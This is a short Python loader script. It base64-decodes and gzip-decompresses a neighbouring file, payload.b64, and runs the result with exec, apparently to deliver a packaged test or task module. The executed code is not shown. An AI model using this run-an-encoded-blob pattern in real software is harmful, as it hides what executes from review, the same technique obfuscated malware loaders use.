from pathlib import Path
from base64 import b64decode
from gzip import decompress
root=Path(__file__).resolve().parent
source=decompress(b64decode((root/'payload.b64').read_text().strip()))
exec(compile(source,'nar_functional_v49_payload.py','exec'))
